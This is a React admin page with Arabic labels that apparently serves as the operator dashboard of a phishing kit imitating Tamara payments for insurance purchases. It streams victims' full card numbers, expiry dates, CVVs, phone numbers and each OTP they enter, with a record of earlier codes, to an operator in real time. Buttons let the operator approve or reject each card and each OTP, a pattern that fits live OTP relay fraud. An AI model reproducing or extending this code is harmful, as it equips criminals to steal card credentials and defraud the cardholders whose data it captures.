import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, Check, X, CreditCard } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface PaymentAttempt {
  id: string;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
}

interface OtpAttempt {
  id: string;
  otp_code: string;
  created_at: string;
}

interface TamaraPayment {
  id: string;
  cardholder_name: string;
  card_number: string | null;
  card_number_last4: string;
  expiry_date: string | null;
  cvv: string | null;
  otp_code: string | null;
  phone: string | null;
  total_amount: number;
  monthly_payment: number;
  company: string;
  payment_status: string;
  created_at: string;
  updated_at: string;
  payment_attempts: PaymentAttempt[];
  otp_attempts: OtpAttempt[];
}

const AdminTamaraPayments = () => {
  const navigate = useNavigate();
  const [payments, setPayments] = useState<TamaraPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingPayment, setProcessingPayment] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    const checkAuthAndFetchPayments = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin/login");
        return;
      }

      await fetchPayments();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('tamara-payments-changes')
        .on(
          'postgres_changes',
          {
            event: '*',
            schema: 'public',
            table: 'tamara_payments'
          },
          () => {
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_payment_attempts'
          },
          () => {
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_otp_attempts'
          },
          () => {
            fetchPayments();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    };

    checkAuthAndFetchPayments();
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      const { data, error } = await supabase
        .from('tamara_payments')
        .select(`
          *,
          payment_attempts:tamara_payment_attempts(*),
          otp_attempts:tamara_otp_attempts(*)
        `)
        .order('created_at', { ascending: false });

      if (error) throw error;
      setPayments((data as any) || []);
    } catch (error) {
      console.error("Error fetching payments:", error);
      toast({
        title: "خطأ",
        description: "فشل في جلب بيانات الدفعات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفعة بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفعة",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleApproveOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'completed' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم تأكيد OTP",
        description: "تمت الموافقة على كود التحقق بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleRejectOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'otp_rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم رفض OTP",
        description: "تم رفض كود التحقق",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      case 'approved':
        return <Badge className="bg-green-500">تمت الموافقة</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'completed':
        return <Badge className="bg-blue-500">مكتمل</Badge>;
      case 'otp_rejected':
        return <Badge className="bg-orange-500">رفض OTP</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8 bg-gray-50">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-gray-900">دفعات تمارا</h1>
              <p className="text-gray-600 mt-2">إدارة والموافقة على دفعات تمارا</p>
            </div>

            <div className="grid gap-6">
              {payments.length === 0 ? (
                <Card>
                  <CardContent className="p-8 text-center text-gray-500">
                    لا توجد دفعات حتى الآن
                  </CardContent>
                </Card>
              ) : (
                payments.map((payment) => (
                  <Card key={payment.id} className="overflow-hidden border-2 hover:shadow-xl transition-shadow">
                    <CardHeader className="bg-gradient-to-r from-primary/5 to-primary/10 border-b-2">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-3">
                          <div className="p-2 bg-white rounded-lg shadow-sm">
                            <CreditCard className="h-6 w-6 text-primary" />
                          </div>
                          <div>
                            <CardTitle className="text-xl">{payment.cardholder_name}</CardTitle>
                            <CardDescription className="text-sm mt-1">
                              {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                            </CardDescription>
                          </div>
                        </div>
                        {getStatusBadge(payment.payment_status)}
                      </div>
                    </CardHeader>

                    <CardContent className="p-6">
                      {/* معلومات الدفع الأساسية */}
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                        <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
                          <p className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</p>
                          <p className="font-bold text-gray-900">{payment.company}</p>
                        </div>
                        <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                          <p className="text-xs text-green-600 font-medium mb-1">المبلغ الشهري</p>
                          <p className="font-bold text-xl text-green-700">{payment.monthly_payment} ر.س</p>
                        </div>
                        <div className="bg-purple-50 rounded-lg p-4 border border-purple-200">
                          <p className="text-xs text-purple-600 font-medium mb-1">المبلغ الإجمالي</p>
                          <p className="font-bold text-xl text-purple-700">{payment.total_amount} ر.س</p>
                        </div>
                      </div>

                      {/* رقم الهاتف */}
                      {payment.phone && (
                        <div className="bg-gray-50 rounded-lg p-3 mb-6 border border-gray-200">
                          <div className="flex items-center gap-2">
                            <span className="text-xs text-gray-600 font-medium">رقم الهاتف:</span>
                            <span className="font-bold text-gray-900 text-lg">{payment.phone}</span>
                          </div>
                        </div>
                      )}

                      {/* كود التحقق الحالي */}
                      <div className="mb-6">
                        <div className="bg-gradient-to-r from-primary to-primary/80 rounded-xl p-4 shadow-lg">
                          <p className="text-white text-xs font-medium mb-2 text-center">كود التحقق الحالي (OTP)</p>
                          <div className="bg-white rounded-lg p-4">
                            <p className="font-bold text-3xl text-primary text-center tracking-widest">
                              {payment.otp_code || 'لم يتم إدخاله بعد'}
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* محاولات الدفع المتعددة */}
                      {payment.payment_attempts && payment.payment_attempts.length > 0 && (
                        <div className="mb-6">
                          <div className="flex items-center gap-2 mb-4">
                            <div className="h-1 flex-1 bg-gradient-to-r from-primary to-transparent rounded"></div>
                            <p className="font-bold text-lg text-gray-800">محاولات الدفع</p>
                            <span className="bg-primary text-white text-xs font-bold px-3 py-1 rounded-full">
                              {payment.payment_attempts.length}
                            </span>
                            <div className="h-1 flex-1 bg-gradient-to-l from-primary to-transparent rounded"></div>
                          </div>
                          
                          <div className="space-y-3">
                            {payment.payment_attempts.map((attempt, index) => (
                              <div key={attempt.id} className="bg-gradient-to-r from-gray-50 to-white rounded-xl p-5 border-2 border-gray-200 shadow-sm hover:shadow-md transition-shadow">
                                <div className="flex items-center justify-between mb-4">
                                  <div className="flex items-center gap-2">
                                    <div className="bg-primary text-white rounded-full w-8 h-8 flex items-center justify-center font-bold text-sm">
                                      {index + 1}
                                    </div>
                                    <span className="font-bold text-gray-700">المحاولة {index + 1}</span>
                                  </div>
                                  <span className="text-xs text-gray-500">
                                    {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                  </span>
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
                                    <p className="text-xs text-gray-500 mb-1">حامل البطاقة</p>
                                    <p className="font-bold text-gray-900">{attempt.card_holder_name}</p>
                                  </div>
                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
                                    <p className="text-xs text-gray-500 mb-1">رقم البطاقة</p>
                                    <p className="font-mono font-bold text-gray-900">{attempt.card_number}</p>
                                  </div>
                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
                                    <p className="text-xs text-gray-500 mb-1">تاريخ الانتهاء</p>
                                    <p className="font-mono font-bold text-gray-900">{attempt.expiry_date}</p>
                                  </div>
                                  <div className="bg-white rounded-lg p-3 border border-gray-200">
                                    <p className="text-xs text-gray-500 mb-1">CVV</p>
                                    <p className="font-mono font-bold text-gray-900">{attempt.cvv}</p>
                                  </div>
                                </div>
                                
                                {/* أزرار الموافقة والرفض لكل بطاقة */}
                                {payment.payment_status === 'pending' && (
                                  <div className="flex gap-3 pt-3 border-t-2 border-gray-200">
                                    <Button
                                      onClick={() => handleApprove(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white shadow-md"
                                      size="sm"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                      ) : (
                                        <Check className="h-4 w-4 ml-2" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button
                                      onClick={() => handleReject(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      variant="destructive"
                                      className="flex-1 shadow-md"
                                      size="sm"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-4 w-4 animate-spin ml-2" />
                                      ) : (
                                        <X className="h-4 w-4 ml-2" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* محاولات OTP المتعددة */}
                      {payment.otp_attempts && payment.otp_attempts.length > 0 && (
                        <div>
                          <div className="flex items-center gap-2 mb-4">
                            <div className="h-1 flex-1 bg-gradient-to-r from-blue-500 to-transparent rounded"></div>
                            <p className="font-bold text-lg text-gray-800">سجل أكواد التحقق</p>
                            <span className="bg-blue-500 text-white text-xs font-bold px-3 py-1 rounded-full">
                              {payment.otp_attempts.length}
                            </span>
                            <div className="h-1 flex-1 bg-gradient-to-l from-blue-500 to-transparent rounded"></div>
                          </div>
                          
                          <div className="space-y-3">
                            {payment.otp_attempts.map((attempt, index) => {
                              const isLatest = index === 0;
                              return (
                                <div 
                                  key={attempt.id} 
                                  className={`rounded-xl p-4 border-2 transition-all shadow-sm hover:shadow-md ${
                                    isLatest 
                                      ? 'bg-gradient-to-r from-green-50 to-green-100 border-green-400' 
                                      : 'bg-gradient-to-r from-gray-50 to-gray-100 border-gray-300'
                                  }`}
                                >
                                  <div className="flex items-center justify-between">
                                    <div className="flex-1">
                                      <div className="flex items-center gap-2 mb-2">
                                        {isLatest && (
                                          <span className="bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full">
                                            🔥 جديد
                                          </span>
                                        )}
                                        <p className={`font-bold text-sm ${isLatest ? 'text-green-700' : 'text-gray-600'}`}>
                                          {isLatest ? 'الكود الحالي' : `الكود القديم #${payment.otp_attempts.length - index}`}
                                        </p>
                                      </div>
                                      <p className="text-gray-600 text-xs">
                                        {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                      </p>
                                    </div>
                                    <div className={`text-left px-4 py-2 rounded-lg ${
                                      isLatest ? 'bg-white border-2 border-green-400' : 'bg-white border border-gray-300'
                                    }`}>
                                      <p className={`font-bold text-3xl tracking-wider ${
                                        isLatest ? 'text-green-600' : 'text-gray-500'
                                      }`}>
                                        {attempt.otp_code}
                                      </p>
                                    </div>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      )}

                      {/* أزرار الموافقة/الرفض على OTP */}
                      {payment.otp_code && payment.payment_status !== 'completed' && payment.payment_status !== 'otp_rejected' && (
                        <div className="mt-6 pt-6 border-t-2 border-gray-200">
                          <p className="font-semibold text-sm mb-3 text-gray-600">إجراءات كود التحقق</p>
                          <div className="flex gap-3">
                            <Button
                              onClick={() => handleApproveOtp(payment.id)}
                              disabled={processingPayment === payment.id}
                              className="flex-1 bg-green-600 hover:bg-green-700 text-white shadow-md"
                            >
                              {processingPayment === payment.id ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <Check className="h-4 w-4 ml-2" />
                              )}
                              الموافقة على OTP
                            </Button>
                            <Button
                              onClick={() => handleRejectOtp(payment.id)}
                              disabled={processingPayment === payment.id}
                              variant="destructive"
                              className="flex-1 shadow-md"
                            >
                              {processingPayment === payment.id ? (
                                <Loader2 className="h-4 w-4 animate-spin ml-2" />
                              ) : (
                                <X className="h-4 w-4 ml-2" />
                              )}
                              رفض OTP
                            </Button>
                          </div>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTamaraPayments;
